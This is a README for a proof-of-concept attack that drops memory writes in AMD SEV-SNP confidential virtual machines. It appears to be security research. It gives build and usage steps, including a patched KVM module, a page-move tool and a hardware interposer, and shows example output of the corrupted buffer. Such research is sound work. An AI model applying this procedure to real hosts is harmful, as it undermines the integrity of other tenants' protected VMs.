# Simple drop write attack on SEV-SNP

This is a PoC for a drop write attack on an SEV-SNP VM. It assumes a cooperative
debug scenario where a victim and attack are manually synchronized through a
CLI interface.

An example screenshot of the successful attack is shown in [sev-drop-write.png](sev-drop-write.png).

The victim VM will:
* Initialize its buffer with all zeros.
* Overwrite the buffer with all ones.
* Print the final buffer.

The attacker aims to drop the victim's write, resulting in a buffer containing zeros.

## Build

Building this PoC requires you to follow the README in `../snp_page_move` to apply the KVM patch to your kernel. You will only need to rebuild the KVM and CCP module, not the whole kernel. The folder contains a README with more instructions.

Afterwards, you can build the attack code with `make`.

This will build the following artifact:
- `./build/binaries/ddrop-vm-victim`

## Use

1) Issue `sudo insmod <path to kmod_movepage.ko>` to load the kernel module that facilitates SEV page moving
2) Copy `ddrop-vm-victim` to the VM and run it with sudo. Let <VICTIM_GPA> be the GPA shown in the `Guest physical address: ...` line
3) On the host, choose an affected HPA, and run `sudo ./movepage <PID> <VICTIM GPA> <TARGET HPA>`
4) Follow the instructions printed by `ddrop-vm-victim` to enable the interposer and drop the write.

If successful, the final value for the memory buffer displayed by `ddrop-vm-victim` should contain zeros instead of all `0xff`. Note that not all lines will be zero due to subchannel interleaving. See below for expected output.


## Example output

If the attack was successful, certain cache lines within the victim buffer should be zero. Note that not all cache lines are affected due to subchannel interleaving. 

### SEV-SNP Victim

```
$ sudo ./ddrop-vm-victim
Allocated memory buffer of 4096 bytes
 --> Guest virtual address: 0x7ef2b0205000
 --> Guest physical address: 0x1aaf4000

Move page, then press enter

Buffer initialized to zero:
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

Enable the interposer, then press enter

Setting buffer to 0xff

Disable the interposer, then press enter

Printing memory buffer
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
```
